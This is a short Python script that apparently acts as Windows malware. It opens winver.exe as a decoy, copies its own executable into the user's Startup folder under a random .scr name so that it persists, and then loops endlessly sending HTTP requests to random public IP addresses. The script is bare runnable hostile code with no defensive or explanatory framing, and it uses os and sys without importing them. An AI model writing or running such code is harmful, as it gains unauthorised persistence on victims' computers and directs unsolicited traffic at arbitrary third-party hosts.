import random
import socket
import time
import shutil
import getpass
winuser = getpass.getuser()
randomvar = random.random()
os.system("cmd /c winver.exe")
shutil.copy(sys.executable, f"C:/Users/{winuser}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/yes{randomvar}.scr")
def generate_random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def send_packet(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
        s.close()
    except:
        pass

def main():
    port = 80
    while True:
        ip = generate_random_ip()
        if not ip.startswith("192.168") and not ip.startswith("10.") and not ip.startswith("172.16") and not ip.startswith("127."):
            send_packet(ip, port)
            time.sleep(0.1)

if __name__ == "__main__":
    main()
